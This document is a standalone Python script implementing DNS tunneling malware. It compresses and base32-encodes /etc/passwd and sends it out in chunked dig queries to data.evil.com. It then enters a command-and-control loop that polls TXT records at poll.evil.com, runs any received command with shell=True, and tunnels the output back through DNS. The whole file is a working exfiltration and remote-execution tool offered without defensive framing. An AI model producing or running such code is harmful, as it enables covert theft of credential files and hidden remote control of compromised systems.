python
import base64
import gzip
import subprocess
import time
import os

ATTACKER_DOMAIN = "data.evil.com"
RESOLVER = "192.168.10.53"
CHUNK_SIZE = 60

def exfiltrate(filepath):
    with open(filepath, 'rb') as f:
        data = f.read()
    compressed = gzip.compress(data)
    encoded = base64.b32encode(compressed).decode()
    chunks = [encoded[i:i+CHUNK_SIZE] for i in range(0, len(encoded), CHUNK_SIZE)]
    total = len(chunks)
    print(f"[*] File split into {total} chunks.")

    for i, chunk in enumerate(chunks):
        query = f"{chunk}.{i}.{ATTACKER_DOMAIN}"
        subprocess.run(["dig", "@" + RESOLVER, query, "+short"], capture_output=True)
        print(f"[+] Sent chunk {i+1}/{total}")
        time.sleep(0.1)

    subprocess.run(["dig", "@" + RESOLVER, f"END.{total}.{ATTACKER_DOMAIN}", "+short"], capture_output=True)
    print("[✓] Exfiltration complete!")

def c2_loop():
    while True:
        try:
            result = subprocess.run(["dig", "@" + RESOLVER, "poll.evil.com", "TXT", "+short"], capture_output=True, text=True)
            cmd = result.stdout.strip().strip('"')
            if cmd and cmd.startswith("RUN:"):
                command = cmd.replace("RUN:", "").strip()
                print(f"[+] Command received: {command}")
                out = subprocess.run(command, shell=True, capture_output=True, text=True)
                output_data = out.stdout + out.stderr
                if not output_data: output_data = "No output"
                
                encoded_result = base64.b32encode(output_data.encode()).decode()
                result_chunks = [encoded_result[i:i+60] for i in range(0, len(encoded_result), 60)]
                
                for i, chunk in enumerate(result_chunks):
                    subprocess.run(["dig", "@" + RESOLVER, f"{chunk}.{i}.result.evil.com", "+short"], capture_output=True)
                    time.sleep(0.1)
                subprocess.run(["dig", "@" + RESOLVER, f"END.{len(result_chunks)}.result.evil.com", "+short"], capture_output=True)
                print(f"[✓] Result sent back to attacker.")
        except Exception as e:
            pass
        time.sleep(10)

if __name__ == "__main__":
    exfiltrate("/etc/passwd")
    c2_loop()
